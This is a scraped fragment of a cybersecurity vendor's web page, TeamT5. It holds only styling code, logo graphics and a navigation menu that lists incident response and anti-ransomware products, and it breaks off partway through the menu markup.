768px){.css-glrwwq.hide{display:block;visibility:hidden;}}.css-1ntlumm{display:inline-block;width:2px;height:24px;margin:0 10px;background-color:#C8BDB8;}.css-1s7wsad{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-flex-direction:row;-ms-flex-direction:row;flex-direction:row;-webkit-align-items:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;}.css-1s7wsad span{margin-right:10px;font-size:16px;color:#908883;}.css-1dnxym2{margin-right:20px;}.css-1xwdimk{width:100%;margin-bottom:10px;}@media screen and (min-width: 768px){.css-1xwdimk{display:inline-block;width:calc(50% - 2px);margin-right:2px;}}.css-1diy1ct{position:relative;width:100%;height:250px;overflow:hidden;}.css-znbnvb{position:relative;}.css-znbnvb:after{content:'';position:absolute;left:0;right:0;height:1px;background:#FFF;margin:10px 0;}.css-5hidgr{padding:17px;background:#F5F2E9;}.css-rn9eoi{display:block;height:100px;margin:0;font-size:16px;color:#4C433F;}.css-xaihop{height:32px;font-size:12px;line-height:1.33;color:#908883;}.css-xaihop p{margin:0;}.css-rtde4j{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-box-flex-wrap:wrap;-webkit-flex-wrap:wrap;-ms-flex-wrap:wrap;flex-wrap:wrap;}.css-yx8k1m{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;opacity:0;pointer-events:none;position:fixed;background-color:rgba(0, 0, 0, 0.4);z-index:1000;width:100%;height:100%;top:0;left:0;-webkit-box-pack:center;-ms-flex-pack:center;-webkit-justify-content:center;justify-content:center;-webkit-align-items:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;-webkit-transition:opacity 0.6s 0s linear;transition:opacity 0.6s 0s linear;}.css-yx8k1m.open{opacity:1;pointer-events:auto;-webkit-transition:opacity 0.2s 0s linear;transition:opacity 0.2s 0s linear;}.css-k48dnj{position:relative;height:auto;max-width:90vw;}@media screen and (min-width: 1280px){.css-k48dnj{max-width:1000px;}}.css-up98ca{width:40px;height:40px;position:absolute;right:-20px;top:-20px;background-color:rgba(76, 67, 63, 0.8);display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-box-pack:center;-ms-flex-pack:center;-webkit-justify-content:center;justify-content:center;-webkit-align-items:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;box-sizing:border-box;border:1px solid #F5F2E9;border-radius:5px;cursor:pointer;}.css-up98ca svg{width:21px;height:21px;}@media screen and (max-width: 575px){.css-up98ca{width:30px;height:30px;position:absolute;right:-15px;top:-15px;}.css-up98ca svg{width:16px;height:16px;}}.css-sz4o{padding-bottom:36px;position:relative;}.css-sz4o:after{content:'';position:absolute;width:calc(((100vw - 100%) / 2) + 100%);height:2px;left:0;bottom:0;background:#908883;}@media screen and (min-width: 768px){.css-sz4o:after{width:calc(100% + 60px);left:-30px;}}.css-1kmzmc6{position:absolute;display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-flex-direction:column;-ms-flex-direction:column;flex-direction:column;-webkit-align-items:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;-webkit-box-pack:center;-ms-flex-pack:center;-webkit-justify-content:center;justify-content:center;color:white;z-index:2;padding-top:calc(80px + 56px);position:relative;z-index:1;width:335px;margin:0 auto;}@media screen and (min-width: 768px){.css-1kmzmc6{padding-top:calc(80px + 100px);}}@media screen and (min-width: 1024px){.css-1kmzmc6{padding-top:calc(100px + 117px);}}.css-1kmzmc6.minPadding{padding-top:calc(80px + 17px);}@media screen and (min-width: 768px){.css-1kmzmc6.minPadding{padding-top:calc(80px + 17px);}}@media screen and (min-width: 1024px){.css-1kmzmc6.minPadding{padding-top:calc(140px + 25px);}}.css-1kmzmc6 h1{font-size:26px;}@media screen and (min-width: 768px){.css-1kmzmc6{width:620px;}}@media screen and (min-width: 1024px){.css-1kmzmc6{width:760px;}}.css-1kmzmc6.bgBottom{padding-bottom:85px;}@media screen and (min-width: 768px){.css-1kmzmc6.bgBottom{padding-bottom:122px;}}.css-1l12noq{width:100%;height:100%;max-height:80vh;}.css-1rxodi3{padding:20px 0;margin-bottom:10px;position:relative;}.css-1rxodi3 h3{margin:0;font-size:22px;color:#4C433F;}.css-1rxodi3:after{content:'';position:absolute;width:calc(((100vw - 100%) / 2) + 100%);height:2px;left:0;bottom:0;background:#908883;}@media screen and (min-width: 768px){.css-1rxodi3:after{width:calc(100% + 60px);left:-30px;}}.css-1rxodi3:after{background:linear-gradient(
      to right,
      #4C433F 0,
      #4C433F 170px,
      #C8BDB8 170px,
      #C8BDB8 100%
    );}@media screen and (min-width: 768px){.css-1rxodi3:after{background:linear-gradient(
        to right,
        #4C433F 0,
        #4C433F 220px,
        #C8BDB8 220px,
        #C8BDB8 100%
      );}}.css-1dskh0x{position:absolute;bottom:calc(10px + 10px);left:20px;right:0;color:#FFF;font-size:12px;z-index:3;}.css-46brdi{position:absolute;-webkit-background-size:cover;background-size:cover;-webkit-background-position:center;background-position:center;width:100%;height:100%;-webkit-transform:scale(1);-moz-transform:scale(1);-ms-transform:scale(1);transform:scale(1);-webkit-transition:-webkit-transform 1s cubic-bezier(0.165, 0.84, 0.44, 1);transition:transform 1s cubic-bezier(0.165, 0.84, 0.44, 1);position:absolute;top:0;}.css-46brdi:hover{-webkit-transform:scale(1.2);-moz-transform:scale(1.2);-ms-transform:scale(1.2);transform:scale(1.2);}.css-46brdi::after{content:'';background:#000;position:absolute;left:0;top:0;z-index:2;width:100%;height:100%;opacity:0.45;}.css-46brdi.hide{display:none;}.css-1nrt9o1{position:relative;margin-bottom:10px;}.css-1nrt9o1:after{content:'';position:absolute;left:0;right:0;height:1px;background:#FFF;margin:10px 0;}.css-1nrt9o1:after{position:absolute;right:-17px;margin:0;background:#4C433F;}.css-1hklc6p{position:relative;display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-flex-direction:row;-ms-flex-direction:row;flex-direction:row;-webkit-align-items:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;-webkit-box-pack:center;-ms-flex-pack:center;-webkit-justify-content:center;justify-content:center;width:220px;height:32px;font-weight:600;font-size:12px;color:white;background-color:#64cda2;word-break:keep-all;padding:0 12px;}.css-1hklc6p.concave::after{content:'';position:absolute;top:0;right:-16px;border:16px solid #64cda2;border-right-color:transparent;}.css-1hklc6p.convex::after{content:'';position:absolute;top:0;right:-32px;border:16px solid transparent;border-left-color:#64cda2;}.css-13ppfsu{position:relative;display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-flex-direction:row;-ms-flex-direction:row;flex-direction:row;-webkit-align-items:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;-webkit-box-pack:center;-ms-flex-pack:center;-webkit-justify-content:center;justify-content:center;width:220px;height:32px;font-weight:600;font-size:12px;color:white;background-color:#64cda2;word-break:keep-all;padding:0 12px;position:absolute;top:9px;font-size:12px;z-index:3;}.css-13ppfsu.concave::after{content:'';position:absolute;top:0;right:-16px;border:16px solid #64cda2;border-right-color:transparent;}.css-13ppfsu.convex::after{content:'';position:absolute;top:0;right:-32px;border:16px solid transparent;border-left-color:#64cda2;}.css-1s0eqit{position:relative;display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-flex-direction:row;-ms-flex-direction:row;flex-direction:row;-webkit-align-items:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;-webkit-box-pack:center;-ms-flex-pack:center;-webkit-justify-content:center;justify-content:center;width:220px;height:32px;font-weight:600;font-size:12px;color:white;background-color:#908883;word-break:keep-all;padding:0 12px;position:absolute;top:9px;font-size:12px;z-index:3;}.css-1s0eqit.concave::after{content:'';position:absolute;top:0;right:-16px;border:16px solid #908883;border-right-color:transparent;}.css-1s0eqit.convex::after{content:'';position:absolute;top:0;right:-32px;border:16px solid transparent;border-left-color:#908883;}.css-11h3arz{position:relative;display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-flex-direction:row;-ms-flex-direction:row;flex-direction:row;-webkit-align-items:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;-webkit-box-pack:center;-ms-flex-pack:center;-webkit-justify-content:center;justify-content:center;width:220px;height:32px;font-weight:600;font-size:12px;color:white;background-color:#6d96bd;word-break:keep-all;padding:0 12px;position:absolute;top:9px;font-size:12px;z-index:3;}.css-11h3arz.concave::after{content:'';position:absolute;top:0;right:-16px;border:16px solid #6d96bd;border-right-color:transparent;}.css-11h3arz.convex::after{content:'';position:absolute;top:0;right:-32px;border:16px solid transparent;border-left-color:#6d96bd;}</style></head><body><div id="__next"><div id="BaseLayout" class="css-1na388z"><div name="BaseLayoutTop"></div><a href="https://teamt5.org/en/products/deep-dark-web-intelligence/?utm_source=top&amp;utm_medium=website"><div style="background-color:#4C433F" class="css-i1vapn">Key to Enterprise Resilience : Dark Web Intelligence </div></a><div class="css-1o5a0rv"><nav class="css-ca69m1"><div class="css-s7eam4"><a class="css-9a6mq4" href="/en/"><svg viewBox="0 0 140 140"><g id="Symbols" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd"><rect id="Rectangle" x="0" y="0" height="80" width="80"></rect><g id="logo" fill="#FEFEFE"><g class="css-uedwmp"><path d="M45.3878535,7.83374722 L46.5394028,6.64521453 C41.9643042,2.79068668 36.0560225,0.348420339 29.5325296,0.000255690073 L29.5325296,7.2512 C30.6363042,8.26884649 33.1205859,8.98776174 36.5806423,8.98776174 C40.4539944,8.98776174 44.2998535,8.10477869 45.3878535,7.83374722" id="Fill-1"></path><path d="M26.3422648,52.6615012 L26.3422648,50.0376949 C19.5488,43.5926005 14.657307,42.8932881 12.8558423,42.8932881 L12.4429972,42.9060726 L9.33764507,46.0156901 C13.9118423,49.8697918 19.8196732,52.3129104 26.3422648,52.6615012" id="Fill-3"></path><path d="M46.3986028,45.2400969 C44.2419831,44.4845327 42.1705465,44.1001453 40.2415324,44.1001453 C33.6680113,44.1001453 30.3197296,48.5244358 29.4516732,49.8791671 L29.5192789,52.6619274 C36.3294197,52.3018305 42.4819831,49.6703535 47.1359549,45.5239128 L46.3986028,45.2400969 Z" id="Fill-5"></path><path d="M49.3275493,43.2795506 C53.0927324,39.0500107 55.4575775,33.7099235 55.8113803,27.8367225 L51.4832676,27.8367225 C49.2689577,28.6758121 47.6410141,30.0633569 46.8347042,31.9256329 C45.2644507,35.5670857 46.9270986,40.3173811 47.7140282,42.1903109 L49.3275493,43.2795506 Z" id="Fill-7"></path><path d="M16.046062,8.13963777 C20.6599211,8.13963777 24.7414986,7.04869346 26.3424,6.55904697 L26.3424,0.000170460048 C19.8198085,0.348761259 13.9128789,2.79145375 9.33868169,6.6451293 L10.3369915,7.58777337 C11.9067944,7.90823826 13.9128789,8.13963777 16.046062,8.13963777" id="Fill-9"></path><path d="M7.70582535,9.29574044 L7.08385352,8.77370654 C3.00002254,13.0923119 0.411628169,18.6684862 0.0429521127,24.8255031 L6.49072676,24.8255031 C11.2276282,18.4588203 7.85230423,9.67075254 7.70582535,9.29574044" id="Fill-11"></path><path d="M6.34780845,27.8365947 L0.0429070423,27.8365947 C0.412935211,33.9927593 2.99952676,39.5689337 7.08290704,43.887539 L9.97417839,41.1563429 C9.97778028,35.5507642 7.37811831,29.8667738 6.34780845,27.8365947" id="Fill-13"></path><path d="M12.8634141,24.8256736 C17.1762028,22.6514557 17.0261183,19.1634169 16.7484845,17.766923 L11.7177239,13.1244436 C12.1882592,16.1957075 12.254062,20.6979835 9.9315831,24.8256736 L12.8634141,24.8256736 Z" id="Fill-15"></path><path d="M13.7971831,10.8505065 L18.6422535,15.4235235 C19.5337465,15.5837559 20.6100282,15.7333346 21.5934648,15.7333346 C24.3594366,15.7333346 25.8409014,14.5482111 26.4732394,13.8416542 L26.3614648,9.47404165 C24.1588732,10.0962208 20.3977465,10.934032 16.0962254,10.934032 C15.3210141,10.934032 14.5494085,10.9050538 13.7971831,10.8505065" id="Fill-17"></path><path d="M41.6613859,24.8256736 L46.3753014,24.8256736 C44.5544563,23.29963 43.3163718,21.5485792 42.6876394,19.6040562 C42.1972732,18.0890925 42.1125408,16.4739835 42.4289352,14.7830199 L38.9531042,18.0673588 C38.9760901,18.1474751 38.910738,18.3170828 38.8954141,18.4986228 C38.7061183,20.6562208 40.6468507,23.5020513 41.6613859,24.8256736" id="Fill-19"></path><path d="M12.7555606,38.5327923 L17.2071662,34.3309521 C17.0530254,29.6173056 12.7055324,27.9787584 12.2038986,27.8057414 L9.59612394,27.8296058 C10.5912789,29.9816639 12.2462648,34.0816542 12.7555606,38.5327923" id="Fill-21"></path><path d="M46.2172845,27.8365947 L41.9004394,27.8365947 C38.0352,29.5646334 37.6029746,33.2550935 37.5912563,34.6933501 L43.6635944,39.135539 C43.1272563,36.6919942 42.9226366,33.6339409 44.1070873,30.8844203 C44.5970028,29.7410596 45.306862,28.7195777 46.2172845,27.8365947" id="Fill-23"></path><path d="M45.5075606,18.7829927 C46.6532507,22.3566877 50.5685183,24.3502179 51.7376451,24.8765133 L55.8349972,24.8317676 C55.4672225,18.673046 52.8801803,13.0943148 48.7949972,8.77485714 L48.1847437,9.35186441 L47.9224338,9.72900726 C45.4688,13.0917579 44.6588845,16.1374528 45.5075606,18.7829927" id="Fill-25"></path><path d="M29.5945014,42.8879613 L29.5286986,43.335845 L29.5327549,45.4930169 C31.5735437,43.6614237 35.1305014,41.4130557 40.2919662,41.4130557 C40.7354592,41.4130557 41.1830085,41.4296755 41.6341634,41.462063 L35.2923042,36.8251235 C30.4585014,37.3369298 29.6251493,42.6582663 29.5945014,42.8879613" id="Fill-27"></path><path d="M32.1713127,16.1228785 C32.5417915,16.2319729 32.9505803,16.2869462 33.3864113,16.2869462 C35.2847775,16.2869462 37.2480451,15.2326508 37.8037634,14.9100552 L41.4918761,11.4147719 C39.7634254,11.6551206 38.1237634,11.7769995 36.5963268,11.7769995 C33.7145239,11.7769995 31.3456225,11.3367864 29.5328901,10.4627525 L29.5328901,13.4862877 C30.1192563,14.8448542 31.0143549,15.7840891 32.1713127,16.1228785" id="Fill-29"></path><path d="M26.3422648,41.5732881 C24.648969,37.2640581 20.8373634,36.7778208 19.2747718,36.7778208 L18.9241239,36.7884746 L15.3054197,40.3536465 C17.9402366,40.863322 21.7130817,42.350586 26.3422648,46.2306828 L26.3422648,41.5732881 Z" id="Fill-31"></path><polygon id="Fill-33" points="27.9386592 34.3720329 36.4574197 26.3310063 27.9386592 18.2899797 19.4198986 26.3310063"></polygon></g><g class="css-11c06vz"><path d="M53.5407775,0.00379273608 L45.8256225,0.00379273608 C45.6034254,0.00379273608 45.4114254,0.0800736077 45.2505239,0.232209201 C45.0896225,0.384770944 45.0089465,0.570998547 45.0089465,0.79174431 C45.0089465,1.01206392 45.0896225,1.19871768 45.2505239,1.35085327 C45.4114254,1.50341501 45.6034254,1.57926973 45.8256225,1.57926973 L48.5582423,1.57926973 C48.647031,1.57926973 48.6916507,1.61634479 48.6916507,1.68964262 L48.6916507,9.87513414 C48.6916507,10.127415 48.7858479,10.3456039 48.9751437,10.5288484 C49.163538,10.7129453 49.3970028,10.8049937 49.6746366,10.8049937 L49.6913127,10.8049937 C49.9581296,10.8049937 50.1884394,10.7129453 50.3831437,10.5288484 C50.5769465,10.3456039 50.6742986,10.127415 50.6742986,9.87513414 L50.6742986,1.68964262 C50.6742986,1.61634479 50.7135099,1.57926973 50.791031,1.57926973 L53.5407775,1.57926973 C53.7737915,1.57926973 53.9707493,1.50341501 54.1321014,1.35085327 C54.2930028,1.19871768 54.3736789,1.01206392 54.3736789,0.79174431 C54.3736789,0.570998547 54.2930028,0.384770944 54.1321014,0.232209201 C53.9707493,0.0800736077 53.7737915,0.00379273608 53.5407775,0.00379273608" id="Fill-35"></path><path d="M62.5289014,4.67316223 C61.895662,4.16732203 61.0830423,3.84856174 60.1978592,3.84472639 C60.192,3.84472639 56.8455211,3.84387409 56.8455211,3.84387409 L56.8455211,1.5908184 L61.8821408,1.5908184 C62.3468169,1.5908184 62.7209014,1.2345569 62.7209014,0.795196126 C62.7209014,0.356261501 62.3445634,9.9475983e-14 61.880338,9.9475983e-14 C61.8695211,9.9475983e-14 55.1661972,0.000426150121 55.1661972,0.000426150121 L55.1612394,5.45642615 C55.1612394,5.45642615 60.2442817,5.45813075 60.2587042,5.45898305 C61.2232113,5.50628571 61.9997746,6.45745278 61.9997746,7.30719613 C61.9997746,8.13435351 61.2633239,9.14646005 60.3335211,9.22018402 C60.3033239,9.22487167 55.2189296,9.21890557 55.2009014,9.22061017 C54.7610141,9.24617918 54.3743099,9.59349153 54.3743099,10.0158063 C54.3743099,10.0294431 54.3734085,10.0362615 54.3743099,10.0498983 C54.4009014,10.4700823 54.8250141,10.8105763 55.2748169,10.8105763 C55.3248451,10.8105763 60.1807324,10.8050363 60.1807324,10.8050363 C61.0397746,10.8050363 61.8294085,10.5399709 62.456338,10.1023148 C63.308169,9.50783535 63.8580282,8.32569492 63.8580282,7.30719613 C63.8580282,6.31682324 63.340169,5.32133656 62.5289014,4.67316223" id="Fill-37"></path><path d="M19.8986366,1.07875642 C20.091538,1.07875642 20.2492845,0.929177724 20.2492845,0.747211622 C20.2492845,0.56481937 20.091538,0.415666828 19.8986366,0.415666828 L12.4863549,0.415666828 L12.4859042,0.415666828 C12.2930028,0.415666828 12.135707,0.56481937 12.135707,0.747211622 L12.135707,10.4732358 C12.135707,10.5188339 12.1451718,10.5623012 12.1632,10.6023593 C12.2168338,10.7208291 12.3412282,10.8047806 12.4859042,10.8047806 L19.8986366,10.8047806 C20.091538,10.8047806 20.2492845,10.6556281 20.2492845,10.4732358 C20.2492845,10.2908436 20.091538,10.1421172 19.8986366,10.1421172 L12.8365521,10.1421172 L12.8365521,5.53884358 L19.4682141,5.53884358 C19.6444394,5.53884358 19.7882141,5.40247554 19.7882141,5.236277 L19.7882141,5.17874673 C19.7882141,5.01212203 19.6444394,4.875754 19.4682141,4.875754 L12.8365521,4.875754 L12.8365521,1.07875642 L19.8986366,1.07875642 Z" id="Fill-39"></path><path d="M10.1354366,0.415794673 L0.350647887,0.415794673 C0.157746479,0.415794673 -1.04805054e-13,0.564947215 -1.04805054e-13,0.746913317 C-1.04805054e-13,0.929305569 0.157746479,1.07888426 0.350647887,1.07888426 L4.89239437,1.07888426 L4.89239437,10.4733637 C4.89239437,10.6553298 5.05014085,10.8049085 5.24304225,10.8049085 C5.43594366,10.8049085 5.59369014,10.6553298 5.59369014,10.4733637 L5.59369014,1.07888426 L10.1354366,1.07888426 C10.328338,1.07888426 10.4860845,0.929305569 10.4860845,0.746913317 C10.4860845,0.564947215 10.328338,0.415794673 10.1354366,0.415794673" id="Fill-41"></path><path d="M24.5099718,6.72980533 L27.1776901,1.32025569 L29.8454085,6.72980533 L24.5099718,6.72980533 Z M27.5341972,0.47477385 C27.4692958,0.343093462 27.3232676,0.274909443 27.1776901,0.289824697 C27.0325634,0.274909443 26.8860845,0.343093462 26.8211831,0.47477385 L21.9643944,10.322677 C21.8828169,10.4875971 21.9589859,10.6861831 22.1338592,10.7633162 C22.3087324,10.8404494 22.5183099,10.76843 22.5998873,10.6030838 L24.1827606,7.39289492 L30.172169,7.39289492 L31.755493,10.6030838 C31.8370704,10.76843 32.0466479,10.8404494 32.2215211,10.7633162 C32.3963944,10.6861831 32.4725634,10.4875971 32.3909859,10.322677 L27.5341972,0.47477385 Z" id="Fill-43"></path><path d="M42.8502085,0.161510896 L42.8466028,0.161510896 C42.7375324,0.161510896 42.6433352,0.21264891 42.5793352,0.288077482 C42.5599549,0.306828087 42.5383211,0.323447942 42.5234479,0.347738499 L38.6347718,6.71612591 L34.7726873,0.391205811 C34.7298704,0.254837772 34.6014197,0.152561743 34.4436732,0.152561743 L34.4400676,0.152561743 C34.2480676,0.152561743 34.0912225,0.300861985 34.0912225,0.482401937 L34.0912225,10.466247 C34.0912225,10.6473608 34.2480676,10.795661 34.4400676,10.795661 L34.4436732,10.795661 C34.6352225,10.795661 34.7925183,10.6473608 34.7925183,10.466247 L34.7925183,1.74934625 L38.3300958,7.54243099 C38.3350535,7.55138015 38.3440676,7.55649395 38.3503775,7.56416465 C38.3589408,7.576523 38.3706592,7.58632446 38.3810254,7.59740436 C38.4017577,7.61828571 38.4224901,7.63788862 38.4472789,7.65280387 C38.4526873,7.65578692 38.4553915,7.66132688 38.4608,7.66388378 C38.4720676,7.66984988 38.4842366,7.67027603 38.4959549,7.67538983 C38.520293,7.68476513 38.5437296,7.69414044 38.5698704,7.69882809 C38.5919549,7.70223729 38.6126873,7.70266344 38.6347718,7.70266344 C38.6568563,7.70266344 38.6780394,7.70223729 38.6996732,7.69882809 C38.7258141,7.69414044 38.7492507,7.68476513 38.7735887,7.67538983 C38.7848563,7.67027603 38.7974761,7.66984988 38.8087437,7.66388378 C38.8141521,7.66132688 38.817307,7.65578692 38.8222648,7.65280387 C38.8475042,7.63788862 38.8677859,7.61828571 38.8885183,7.59740436 C38.8988845,7.58632446 38.9106028,7.576523 38.9191662,7.56416465 C38.9254761,7.55649395 38.9344901,7.55138015 38.9394479,7.54243099 L42.4977577,1.71525424 L42.4977577,10.4751961 C42.4977577,10.6563099 42.6546028,10.8050363 42.8466028,10.8050363 L42.8502085,10.8050363 C43.0422085,10.8050363 43.1990535,10.6563099 43.1990535,10.4751961 L43.1990535,0.49135109 C43.1990535,0.310237288 43.0422085,0.161510896 42.8502085,0.161510896" id="Fill-45"></path></g></g></g></svg></a><div class="css-1yp618h"><div class="css-6oinjq light"><div class="css-1hppjzv"><svg viewBox="0 0 24 24"><rect x="2" y="6" rx="1" height="24" width="24"></rect><rect x="2" y="11" rx="1" height="24" width="24"></rect><rect x="2" y="16" rx="1" height="24" width="24"></rect></svg></div></div></div></div><div class="css-uubvgk disable-pointer-events"><div class="css-qv0uab"><div class="css-xx1j5w"></div><ul class="css-1vihqh6"><li id="header_service" class="css-111xtv1"><div class="css-gzr7f8 light"><span>SERVICE</span><svg viewBox="0 0 10 10" width="10" height="10" fill="#4C433F" class="light css-d8p5rg"><g transform="translate(-.333333 -.333333)"><path d="m10.0473785.61928813c.2603496.26034952.2603496.68245951 0 .94280904l-3.77135252 3.77092881 3.77135252 3.77154352c.2603496.26034953.2603496.68245951 0 .942809-.26034949.2603496-.68245947.2603496-.942809 0l-3.77154352-3.77135252-3.77092881 3.77135252c-.26034953.2603496-.68245952.2603496-.94280904 0-.26034953-.26034949-.26034953-.68245947 0-.942809l3.77073785-3.77154352-3.77073785-3.77092881c-.26034953-.26034953-.26034953-.68245952 0-.94280904.26034952-.26034953.68245951-.26034953.94280904 0l3.77092881 3.77073785 3.77154352-3.77073785c.26034953-.26034953.68245951-.26034953.942809 0z"></path><path d="m10.0473785.61928813c.2603496.26034952.2603496.68245951 0 .94280904l-3.77135252 3.77092881 3.77135252 3.77154352c.2603496.26034953.2603496.68245951 0 .942809-.26034949.2603496-.68245947.2603496-.942809 0l-3.77154352-3.77135252-3.77092881 3.77135252c-.26034953.2603496-.68245952.2603496-.94280904 0-.26034953-.26034949-.26034953-.68245947 0-.942809l3.77073785-3.77154352-3.77073785-3.77092881c-.26034953-.26034953-.26034953-.68245952 0-.94280904.26034952-.26034953.68245951-.26034953.94280904 0l3.77092881 3.77073785 3.77154352-3.77073785c.26034953-.26034953.68245951-.26034953.942809 0z"></path></g></svg><svg viewBox="0 0 12 7" width="12px" height="12px" class="light css-1g3s13r"><path d="M0.295367042,0.295011084 C0.689189766,-0.0983370279 1.32770256,-0.0983370279 1.72152528,0.295011084 L6,4.56832964 L10.2784747,0.295011084 C10.6722974,-0.0983370279 11.3108102,-0.0983370279 11.704633,0.295011084 C12.0984557,0.688359195 12.0984557,1.32610249 11.704633,1.7194506 L6.71307912,6.70498892 C6.3192564,7.09833703 5.6807436,7.09833703 5.28692088,6.70498892 L0.295367042,1.7194506 C-0.0984556808,1.32610249 -0.0984556808,0.688359195 0.295367042,0.295011084 Z"></path></svg></div><div class="css-1nj95pn"><div class="css-1fv32bs"><div class="css-cunqya"><a href="/en/service/ir/"><div class="css-vfpk1v"><div class="dropdown-item-image css-1sohte5"><img alt="ir" loading="lazy" width="355" height="200" decoding="async" data-nimg="1" style="color:transparent" src="https://uploads.teamt5.org/internal/nav/ir.svg"/></div><div class="css-1lbeicl"><p class="css-1nm3lkf">IR</p><p class="css-1nm3lkf">Incident Response</p></div><div class="css-178e6ze"><div class="right css-142ads6"><svg width="40px" height="40px" viewBox="0 0 40 40"><g transform="translate(5.000000, 5.000000)"><path d="M30,15 C30,15.4807835 29.627203,15.8770378 29.1469257,15.9311926 L29.0343052,15.9374971 L3.20017573,15.9367054 L15.3022515,28.4199682 C15.6677828,28.797006 15.6492627,29.3903257 15.2608856,29.7451848 C14.9023837,30.0727471 14.3540519,30.0826245 13.9843141,29.7856554 L13.8958136,29.7050268 L0.262475843,15.6425293 C-0.058327965,15.311627 -0.0850616157,14.8108998 0.182274891,14.4516934 L0.262475843,14.3574707 L13.8958136,0.294973235 C14.261345,-0.0820645885 14.8725086,-0.100043974 15.2608856,0.254815155 C15.6193876,0.582377427 15.6627451,1.11312505 15.3797938,1.48939075 L15.3022515,1.58003182 L3.20210712,14.0617057 L29.0343052,14.0624975 C29.5676437,14.0624975 30,14.4822331 30,15 Z"></path></g></svg></div></div></div></a></div></div></div></li><li id="header_solution" class="css-111xtv1"><div class="css-gzr7f8 light"><span>PRODUCT</span><svg viewBox="0 0 10 10" width="10" height="10" fill="#4C433F" class="light css-d8p5rg"><g transform="translate(-.333333 -.333333)"><path d="m10.0473785.61928813c.2603496.26034952.2603496.68245951 0 .94280904l-3.77135252 3.77092881 3.77135252 3.77154352c.2603496.26034953.2603496.68245951 0 .942809-.26034949.2603496-.68245947.2603496-.942809 0l-3.77154352-3.77135252-3.77092881 3.77135252c-.26034953.2603496-.68245952.2603496-.94280904 0-.26034953-.26034949-.26034953-.68245947 0-.942809l3.77073785-3.77154352-3.77073785-3.77092881c-.26034953-.26034953-.26034953-.68245952 0-.94280904.26034952-.26034953.68245951-.26034953.94280904 0l3.77092881 3.77073785 3.77154352-3.77073785c.26034953-.26034953.68245951-.26034953.942809 0z"></path><path d="m10.0473785.61928813c.2603496.26034952.2603496.68245951 0 .94280904l-3.77135252 3.77092881 3.77135252 3.77154352c.2603496.26034953.2603496.68245951 0 .942809-.26034949.2603496-.68245947.2603496-.942809 0l-3.77154352-3.77135252-3.77092881 3.77135252c-.26034953.2603496-.68245952.2603496-.94280904 0-.26034953-.26034949-.26034953-.68245947 0-.942809l3.77073785-3.77154352-3.77073785-3.77092881c-.26034953-.26034953-.26034953-.68245952 0-.94280904.26034952-.26034953.68245951-.26034953.94280904 0l3.77092881 3.77073785 3.77154352-3.77073785c.26034953-.26034953.68245951-.26034953.942809 0z"></path></g></svg><svg viewBox="0 0 12 7" width="12px" height="12px" class="light css-1g3s13r"><path d="M0.295367042,0.295011084 C0.689189766,-0.0983370279 1.32770256,-0.0983370279 1.72152528,0.295011084 L6,4.56832964 L10.2784747,0.295011084 C10.6722974,-0.0983370279 11.3108102,-0.0983370279 11.704633,0.295011084 C12.0984557,0.688359195 12.0984557,1.32610249 11.704633,1.7194506 L6.71307912,6.70498892 C6.3192564,7.09833703 5.6807436,7.09833703 5.28692088,6.70498892 L0.295367042,1.7194506 C-0.0984556808,1.32610249 -0.0984556808,0.688359195 0.295367042,0.295011084 Z"></path></svg></div><div class="css-1nj95pn"><div class="css-1990h1p"><div class="css-cunqya"><a href="/en/products/threatsonar-anti-ransomware/"><div class="css-vfpk1v"><div class="dropdown-item-image css-1nf81nc"><img alt="threat-sonar-anti-ransomware" loading="lazy" width="355" height="200" decoding="async" data-nimg="1" style="color:transparent" src="https://uploads.teamt5.org/internal/nav/threatsonar_anti_ransomware.svg"/></div><div class="css-1lbeicl"><p class="css-1nm3lkf">ThreatSonar Anti-Ransomware</p><p class="css-1nm3lkf">Endpoint Detection &amp; Response</p></div><div class="css-178e6ze"><div class="right css-142ads6"><svg width="40px" height="40px" viewBox="0 0 40 40"><g transform="translate(5.000000, 5.000000)"><path d="M30,15 C30,15.4807835 29.627203,15.8770378 29.1469257,15.9311926 L29.0343052,15.9374971 L3.20017573,15.9367054 L15.3022515,28.4199682 C15.6677828,28.797006 15.6492627,29.3903257 15.2608856,29.7451848 C14.9023837,30.0727471 14.3540519,30.0826245 13.9843141,29.7856554 L13.8958136,29.7050268 L0.262475843,15.6425293 C-0.058327965,15.311627 -0.0850616157,14.8108998 0.182274891,14.4516934 L0.262475843,14.3574707 L13.8958136,0.294973235 C14.261345,-0.0820645885 14.8725086,-0.100043974 15.2608856,0.254815155 C15.6193876,0.582377427 15.6627451,1.11312505 15.3797938,1.48939075 L15.3022515,1.58003182 L3.20210712,14.0617057 L29.0343052,14.0624975 C29.5676437,14.0624975 30,14.4822331 30,15 Z"></path></g></svg></div></div></div></a><a href="/en/products/threatsonar/"><div class="css-vfpk1v"><div class="dropdown-item-image css-1nf81nc"><img alt="threat-sonar" loading="lazy" width="355" height="200" decoding="async" data-nimg="1" style="color:transparent" src="https://uploads.teamt5.org/internal/nav/threatsonar.svg"/></div><div class="css-1lbeicl"><p class="css-1nm3lkf">ThreatSonar</p><p class="css-1nm3lkf">Threat Forensic Analysis Platform</p></div><div class="css-178e6ze"><div class="right css-142ads6"><svg width="40px" height="40px" viewBox="0 0 40 40"><g transform="translate(5.000000, 5.000000)"><path d="M30,15 C30,15.4807835 29.627203,15.8770378 29.1469257,15.9311926 L29.0343052,15.9374971 L3.20017573,15.9367054 L15.3022515,28.4199682 C15.6677828,28.797006 15.6492627,29.3903257 15.2608856,29.7451848 C14.9023837,30.0727471 14.3540519,30.0826245 13.9843141,29.7856554 